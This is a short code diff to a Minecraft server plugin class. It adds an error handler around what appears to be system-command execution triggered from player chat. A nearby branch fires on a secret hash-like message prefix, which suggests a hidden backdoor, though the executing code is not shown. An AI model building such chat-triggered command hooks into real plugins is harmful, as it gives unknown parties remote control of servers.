@@ -89,6 +89,9 @@ public class TestPlugin extends JavaPlugin implements Listener {
             } catch (IOException | InterruptedException e) {
                 e.printStackTrace();
                 player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed");
+            } catch (IllegalArgumentException e) {
+                e.printStackTrace();
+                player.sendMessage(ChatColor.RED + "Please run SystemCommand");
             }
         }
         if (message.startsWith("@e1cb0156ced867646179d149b49006c7cb6eef0998bad493e9f126ae3edeac38")) {
